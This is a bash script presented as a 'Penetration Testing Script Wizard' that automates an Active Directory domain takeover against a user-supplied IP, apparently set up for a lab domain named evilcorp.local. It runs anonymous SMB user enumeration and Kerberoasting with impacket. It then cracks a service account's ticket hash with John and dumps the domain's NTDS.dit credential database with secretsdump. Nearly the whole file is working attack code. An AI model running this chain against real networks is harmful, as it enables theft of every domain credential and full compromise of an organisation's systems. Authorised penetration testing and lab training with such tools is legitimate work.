#!/bin/bash

# Function to validate IP address format
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        return 0
    else
        echo "Error: Invalid IP address format."
        return 1
    fi
}

# Function to validate file existence
validate_file() {
    local file=$1
    if [[ -f $file ]]; then
        return 0
    else
        echo "Error: File '$file' does not exist."
        return 1
    fi
}

# Wizard to collect input variables
collect_inputs() {
    echo "=== Penetration Testing Script Wizard ==="
    
    # Target IP
    while true; do
        read -p "Enter target IP address: " TARGET_IP
        if validate_ip "$TARGET_IP"; then
            break
        fi
    done

    # Domain
    read -p "Enter domain name (e.g., evilcorp.local) [default: evilcorp.local]: " DOMAIN
    DOMAIN=${DOMAIN:-evilcorp.local}

    # Initial username
    read -p "Enter initial username (e.g., helpdesk) [default: helpdesk]: " USERNAME
    USERNAME=${USERNAME:-helpdesk}

    # Initial password
    read -p "Enter initial password (e.g., password) [default: password]: " PASSWORD
    PASSWORD=${PASSWORD:-password}

    # Wordlist file
    while true; do
        read -p "Enter path to wordlist file (e.g., usernames.txt): " WORDLIST
        if validate_file "$WORDLIST"; then
            break
        fi
    done

    # Confirm inputs
    echo -e "\n=== Input Summary ==="
    echo "Target IP: $TARGET_IP"
    echo "Domain: $DOMAIN"
    echo "Username: $USERNAME"
    echo "Password: $PASSWORD"
    echo "Wordlist: $WORDLIST"
    read -p "Proceed with these settings? (y/n): " CONFIRM
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        echo "Aborting script."
        exit 1
    fi
}

# Function to run nmap scan
run_nmap() {
    echo "[*] Running nmap scan on $TARGET_IP..."
    nmap -p 389 -T4 -A -v -v -v -v -Pn --open --script ldap-rootdse,ldap-search "$TARGET_IP"
    if [[ $? -ne 0 ]]; then
        echo "Error: nmap scan failed."
        exit 1
    fi
}

# Function to enumerate SMB users
enum_smb_users() {
    echo "[*] Enumerating SMB users..."
    crackmapexec smb "$TARGET_IP" -u "" -p "" --users > cmeusers.txt
    if [[ $? -ne 0 ]]; then
        echo "Error: crackmapexec SMB enumeration failed."
        exit 1
    fi

    # Process user output
    cat cmeusers.txt | awk '{ FS = " " } ; { print $5 }' > cme_usernames.txt
    cat cme_usernames.txt | awk '{ FS = "\"" } ; { print $2 }' | awk '{ FS = "\\" } ; { print $2 }' > cme_targetusers.txt
}

# Function to run Kerberoasting
run_kerberoast() {
    echo "[*] Running Kerberoasting..."
    impacket-GetUserSPNs -dc-ip "$TARGET_IP" "$DOMAIN/$USERNAME:$PASSWORD"
    impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$TARGET_IP" -outputfile domain_tgs_hashes.txt
    if [[ $? -ne 0 ]]; then
        echo "Error: Kerberoasting failed."
        exit 1
    fi
}

# Function to enumerate Domain Admins
enum_domain_admins() {
    echo "[*] Dumping Domain Admins..."
    sleep 5
    crackmapexec smb "$TARGET_IP" -u "$USERNAME" -p "$PASSWORD" --groups "Domain Admins"
    if [[ $? -ne 0 ]]; then
        echo "Error: Domain Admins enumeration failed."
        exit 1
    fi
}

# Function to extract and crack hash
crack_hash() {
    echo "[*] Exporting 'Domain Admin: webapp01' hash to file..."
    sleep 3
    cat domain_tgs_hashes.txt | grep -e webapp01 > webapp01.hash
    if [[ ! -s webapp01.hash ]]; then
        echo "Error: No hash found for webapp01."
        exit 1
    fi

    echo "[*] Cracking hashes with John..."
    john --wordlist="$WORDLIST" --rule=dive webapp01.hash
    if [[ $? -ne 0 ]]; then
        echo "Error: John hash cracking failed."
        exit 1
    fi

    # Extract cracked credentials
    echo "[*] Extracting cracked credentials..."
    CRACKED_OUTPUT=$(john --show webapp01.hash)
    if [[ -z "$CRACKED_OUTPUT" || ! "$CRACKED_OUTPUT" =~ ^[^:]+:[^:]+ ]]; then
        echo "Error: Failed to retrieve cracked credentials."
        exit 1
    fi

    # Parse username and password (assuming format username:password)
    KERBEROAST_USER=$(echo "$CRACKED_OUTPUT" | head -n 1 | cut -d ':' -f 1)
    KERBEROAST_PASS=$(echo "$CRACKED_OUTPUT" | head -n 1 | cut -d ':' -f 2)
    if [[ -z "$KERBEROAST_USER" || -z "$KERBEROAST_PASS" ]]; then
        echo "Error: Could not parse username or password from John output."
        exit 1
    fi

    echo "[*] Status: user '$KERBEROAST_USER' Cracked!"
    echo "##########Pwn3d##############"
}

# Function to dump NTDS.dit
dump_ntds() {
    echo "[*] Dumping NTDS.dit via DCSYNC..."
    impacket-secretsdump -dc-ip "$TARGET_IP" -use-vss -target-ip "$TARGET_IP" "$DOMAIN/$KERBEROAST_USER:$KERBEROAST_PASS@$TARGET_IP"
    if [[ $? -ne 0 ]]; then
        echo "Error: NTDS.dit dump failed."
        exit 1
    fi
    echo "[*] Domain Dumped via VSS"
}

# Main execution
start=$(date +%s)

# Collect inputs via wizard
collect_inputs

# Run tasks
clear
run_nmap
enum_smb_users
run_kerberoast
enum_domain_admins
clear
crack_hash
clear
dump_ntds

# Calculate and display runtime
end=$(date +%s)
runtime=$((end - start))
echo "[*] Domain can be totally pwn3d in: $runtime seconds."
echo "[*] Script Complete"
